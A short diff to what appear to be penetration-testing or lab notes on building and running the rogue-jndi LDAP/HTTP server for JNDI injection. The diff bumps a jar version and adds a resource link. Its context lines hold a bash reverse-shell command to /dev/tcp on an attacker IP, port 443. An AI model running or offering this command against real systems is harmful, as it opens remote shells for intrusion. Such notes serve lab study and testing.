@@ -31,7 +31,7 @@ cd ~/rogue-jndi
 mvn package
 
 # get help
-java -jar target/RogueJndi-1.0.jar -h
+java -jar target/RogueJndi-1.1.jar -h
 
 YOURIP="10.10.14.147"
 COMMAND="bash -c 'bash -i >& /dev/tcp/${YOURIP}/443 0>&1'"
@@ -44,3 +44,7 @@ java -jar ./target/RogueJndi-1.1.jar \
   --ldapPort 1389 \
   --httpPort 8000
 ```
+
+## Resources
+
+- [veracode-research/rogue-jndi](https://github.com/veracode-research/rogue-jndi) — LDAP/HTTP gadget server cloned above
